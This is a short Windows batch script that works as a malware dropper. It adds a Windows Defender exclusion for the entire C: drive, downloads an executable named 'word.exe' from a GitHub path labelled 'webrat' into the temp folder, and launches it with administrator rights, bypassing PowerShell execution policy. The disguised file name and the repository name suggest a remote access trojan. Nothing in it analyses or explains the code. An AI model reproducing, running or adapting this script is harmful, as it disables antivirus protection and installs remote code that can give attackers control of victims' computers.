@echo off
powershell.exe -Command Add-MpPreference -ExclusionPath "C:/"
setlocal EnableDelayedExpansion
set "URL=https://raw.githubusercontent.com/Oxapayy/webrat/refs/heads/main/word.exe"
set "Datei=%TEMP%\word.exe"
powershell -NoLogo -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%Datei%'"
cd "C:\Users\%USERNAME%\AppData\Local\Temp"
powershell -Command "Start-Process 'C:\Users\%USERNAME%\AppData\Local\Temp\word.exe' -Verb RunAs"
exit
